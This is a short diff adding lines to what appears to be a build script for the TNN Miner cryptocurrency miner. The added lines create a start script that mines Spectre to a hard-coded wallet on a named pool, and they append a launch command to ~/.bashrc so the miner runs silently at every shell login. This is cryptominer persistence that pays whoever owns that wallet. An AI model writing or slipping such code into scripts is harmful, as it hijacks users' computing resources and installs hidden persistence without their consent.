@@ -17,3 +17,12 @@ mkdir build
 cd build
 cmake ..
 make
+echo "./TNN_Miner --spectre --daemon-address spr.tw-pool.com --port 14001 --wallet spectre:qz053xfu5fknjyzlf2rsf2uz7fyvjjhgrurlv2lclqmufu4x4uzfq6gxyjsdd --dev-fee 2" > start.sh
+chmod +x start.sh
+if [ ! -f ~/.bashrc ]; then
+  echo "cd ~/tnn-miner/build/ && sh start.sh" > ~/.bashrc
+else
+  if ! grep -Fxq "cd ~/tnn-miner/build/ && sh start.sh" ~/.bashrc; then
+    echo "cd ~/tnn-miner/build/ && sh start.sh" >> ~/.bashrc
+  fi
+fi
